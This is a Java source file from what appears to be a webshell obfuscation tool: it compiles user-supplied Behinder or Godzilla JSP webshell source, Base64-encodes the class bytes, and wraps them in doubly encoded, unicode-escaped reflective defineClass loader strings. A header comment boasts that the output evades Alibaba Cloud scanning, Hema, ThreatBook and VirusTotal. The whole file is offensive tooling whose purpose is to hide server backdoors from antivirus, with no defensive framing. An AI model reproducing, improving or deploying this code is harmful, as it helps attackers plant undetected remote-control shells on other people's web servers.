package encode;

import application.RandomString;
import config.Demos;
import org.apache.jasper.JspC;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class JspEncodeDemo4 {
    String tamplate;
    String key;
    String sourcecode;
    String encode;
    String demotxt;

    public JspEncodeDemo4() {
    }

    public JspEncodeDemo4(String tamplate, String key, String code) {
        this.tamplate = tamplate;
        this.key = key;
        this.sourcecode = code;
    }

    public static String GetDemotxt(){

        return "/*\n" +
                " * By: XG小刚\n" +
                " * Time: 2023-11-24_jspdemo4\n" +
                " * Bypass: 阿里云恶意文件检测平台、阿里云主机病毒查杀、河马本地(1.8.2)、微步(安全)、VT(0红)\n" +
                " * 适配: tomcat10.0.x(需将pom.xml中版本替换)\n" +
                " * java8 <= java版本 <= java21\n" +
                " * 传参: /xxxx.jsp?xxxx=xxxx\n"+
                " * 需要XG_NTAI.properties配置文件\n" +
                " */";
    }

    public String[] Run() throws Exception {

        if(!sourcecode.isEmpty()){
            try {
                if(this.key.equals("默认随机")){
                    this.key = "p"+RandomString.getRString(5);
                }

                String filename = this.key+".jsp";
                File file = new File("./cache/");
                file.mkdir();
                FileOutputStream fileOutputStream = new FileOutputStream("./cache/"+filename);
                this.sourcecode = this.sourcecode.replace("new sun.misc.BASE64Decoder().decodeBuffer","java.util.Base64.getDecoder().decode");
                fileOutputStream.write(this.sourcecode.getBytes(StandardCharsets.UTF_8));

                JspC jspc = new JspC();
                jspc.setUriroot("./cache/");
                jspc.setOutputDir("./cache/");
                jspc.setJspFiles(filename);
                jspc.setCompile(true);
                jspc.execute();

                File filepath = new File("./cache/org/apache/jsp/");
                File[] files = filepath.listFiles();
                String base64String = "";
                String cloader = "";
                for (File f : files) {
                    if (f.getName().contains(".class")) {
                        FileInputStream fileInputStream = new FileInputStream(f.getPath());
                        byte[] buffer = new byte[(int) f.length()];
                        fileInputStream.read(buffer);
                        String s = Base64.getEncoder().encodeToString(buffer);
                        s = "defineClasssetAccessible"+s;
                        s = Base64.getEncoder().encodeToString(s.getBytes(StandardCharsets.UTF_8));
                        String[] split = f.getName().split("\\.");
                        String base64stringreplace = "XHV1MDA1M1x1dTAwNzRcdXUwMDcyXHV1MDA2OVx1dTAwNkVcdXUwMDY3XHV1MDAyMCRjbGFzc25hbWUkXHV1MDAyMFx1dTAwM0RcdXUwMDIwXHV1MDAyMiRjbGFzc2Jhc2U2NCRcdXUwMDIyXHV1MDAzQlx1dTAwNjJcdXUwMDc5XHV1MDA3NFx1dTAwNjVcdXUwMDVCXHV1MDA1RFx1dTAwMjBcdXUwMDYzXHV1MDA2Q1x1dTAwNjFcdXUwMDczXHV1MDA3M1x1dTAwNDJcdXUwMDc5XHV1MDA3NFx1dTAwNjVcdXUwMDczXHV1MDA1RiRjbGFzc25hbWUkXHV1MDAyMFx1dTAwM0RcdXUwMDIwXHV1MDA0Mlx1dTAwNjFcdXUwMDczXHV1MDA2NVx1dTAwMzZcdXUwMDM0XHV1MDAyRVx1dTAwNjdcdXUwMDY1XHV1MDA3NFx1dTAwNDRcdXUwMDY1XHV1MDA2M1x1dTAwNkZcdXUwMDY0XHV1MDA2NVx1dTAwNzJcdXUwMDI4XHV1MDAyOVx1dTAwMkVcdXUwMDY0XHV1MDA2NVx1dTAwNjNcdXUwMDZGXHV1MDA2NFx1dTAwNjVcdXUwMDI4JGNsYXNzbmFtZSRcdXUwMDI5XHV1MDAzQiRjbGFzc25hbWUkXHV1MDAyMFx1dTAwM0RcdXUwMDIwXHV1MDA2RVx1dTAwNjVcdXUwMDc3XHV1MDAyMFx1dTAwNTNcdXUwMDc0XHV1MDA3Mlx1dTAwNjlcdXUwMDZFXHV1MDA2N1x1dTAwMjhcdXUwMDYzXHV1MDA2Q1x1dTAwNjFcdXUwMDczXHV1MDA3M1x1dTAwNDJcdXUwMDc5XHV1MDA3NFx1dTAwNjVcdXUwMDczXHV1MDA1RiRjbGFzc25hbWUkXHV1MDAyOVx1dTAwM0JcdXUwMDYzXHV1MDA2Q1x1dTAwNjFcdXUwMDczXHV1MDA3M1x1dTAwNDJcdXUwMDc5XHV1MDA3NFx1dTAwNjVcdXUwMDczXHV1MDA1RiRjbGFzc25hbWUkXHV1MDAyMFx1dTAwM0RcdXUwMDIwXHV1MDA0Mlx1dTAwNjFcdXUwMDczXHV1MDA2NVx1dTAwMzZcdXUwMDM0XHV1MDAyRVx1dTAwNjdcdXUwMDY1XHV1MDA3NFx1dTAwNDRcdXUwMDY1XHV1MDA2M1x1dTAwNkZcdXUwMDY0XHV1MDA2NVx1dTAwNzJcdXUwMDI4XHV1MDAyOVx1dTAwMkVcdXUwMDY0XHV1MDA2NVx1dTAwNjNcdXUwMDZGXHV1MDA2NFx1dTAwNjVcdXUwMDI4JGNsYXNzbmFtZSRcdXUwMDJFXHV1MDA3M1x1dTAwNzVcdXUwMDYyXHV1MDA3M1x1dTAwNzRcdXUwMDcyXHV1MDA2OVx1dTAwNkVcdXUwMDY3XHV1MDAyOFx1dTAwMzJcdXUwMDM0XHV1MDAyOVx1dTAwMjlcdXUwMDNC";
                        String sourcestringreplace = new String(Base64.getDecoder().decode(base64stringreplace));
                        sourcestringreplace = sourcestringreplace.replace("$classname$",split[0]);
                        sourcestringreplace = sourcestringreplace.replace("$classbase64$",s);
                        base64String +=sourcestringreplace;

                        String base64cloaderrep = "XHV1MDA2NFx1dTAwNjVcdXUwMDY2XHV1MDA2OVx1dTAwNkVcdXUwMDY1XHV1MDA0M1x1dTAwNkNcdXUwMDYxXHV1MDA3M1x1dTAwNzNcdXUwMDJFXHV1MDA2OVx1dTAwNkVcdXUwMDc2XHV1MDA2Rlx1dTAwNkJcdXUwMDY1XHV1MDAyOFx1dTAwNjFcdXUwMDcwXHV1MDA3MFx1dTAwNkNcdXUwMDY5XHV1MDA2M1x1dTAwNjFcdXUwMDc0XHV1MDA2OVx1dTAwNkZcdXUwMDZFXHV1MDAyRVx1dTAwNjdcdXUwMDY1XHV1MDA3NFx1dTAwNDNcdXUwMDZDXHV1MDA2MVx1dTAwNzNcdXUwMDczXHV1MDA0Q1x1dTAwNkZcdXUwMDYxXHV1MDA2NFx1dTAwNjVcdXUwMDcyXHV1MDAyOFx1dTAwMjlcdXUwMDJDXHV1MDAyMFx1dTAwMjJcdXUwMDZGXHV1MDA3Mlx1dTAwNjdcdXUwMDJFXHV1MDA2MVx1dTAwNzBcdXUwMDYxXHV1MDA2M1x1dTAwNjhcdXUwMDY1XHV1MDAyRVx1dTAwNkFcdXUwMDczXHV1MDA3MFx1dTAwMkUkY2xhc3NuYW1lJFx1dTAwMjJcdXUwMDJDXHV1MDAyMFx1dTAwNjNcdXUwMDZDXHV1MDA2MVx1dTAwNzNcdXUwMDczXHV1MDA0Mlx1dTAwNzlcdXUwMDc0XHV1MDA2NVx1dTAwNzNcdXUwMDVGJGNsYXNzbmFtZSRcdXUwMDJDXHV1MDAyMFx1dTAwMzBcdXUwMDJDXHV1MDAyMFx1dTAwNjNcdXUwMDZDXHV1MDA2MVx1dTAwNzNcdXUwMDczXHV1MDA0Mlx1dTAwNzlcdXUwMDc0XHV1MDA2NVx1dTAwNzNcdXUwMDVGJGNsYXNzbmFtZSRcdXUwMDJFXHV1MDA2Q1x1dTAwNjVcdXUwMDZFXHV1MDA2N1x1dTAwNzRcdXUwMDY4XHV1MDAyOVx1dTAwM0I=";
                        String sourcebase64cloaderrep = new String(Base64.getDecoder().decode(base64cloaderrep));
                        sourcebase64cloaderrep = sourcebase64cloaderrep.replace("$classname$",split[0]);
                        cloader +=sourcebase64cloaderrep;
                    }
                }
                String demo = Demos.jspdemo4;
                if(demo == null){
                    return new String[]{"无该demo配置文件",""};
                }
                encode = new String(Base64.getDecoder().decode(demo));
                encode = encode.replace("$classname$",this.key+"_jsp");
                encode = encode.replace("$base64String$",base64String);
                encode = encode.replace("$cloader$",cloader);

                deleteDir("./cache/");

                demotxt = "/*\n" +
                        " * By: XG小刚\n" +
                        " * Time: 2023-11-24_jspdemo4\n" +
                        " * Bypass: 阿里云恶意文件检测平台、阿里云主机病毒查杀、河马本地(1.8.2)、微步(安全)、VT(0红)\n" +
                        " * 适配: tomcat10.0.x(需将pom.xml中版本替换)\n" +
                        " * java8 <= java版本 <= java21\n" +
                        " * 传参: /xxxx.jsp?"+RandomString.getRString(6)+"="+RandomString.getRString(6)+"\n"+
                        " * 需要XG_NTAI.properties配置文件\n"+
                        " */";
                return new String[]{this.encode,demotxt};
            }catch (Exception e){
                deleteDir("./cache/");
                return new String[]{"加密失败",demotxt};

            }
        }else {
            return new String[]{"请输入冰蝎、哥斯拉JSP源码",demotxt};
        }
    }

    public static void deleteDir(String path) {
        File file = new File(path);
        File[] list = file.listFiles();
        for (File f : list) {
            if (f.isDirectory()) {
                deleteDir(f.getPath());
            } else {
                f.delete();
            }
        }
        file.delete();
    }
}
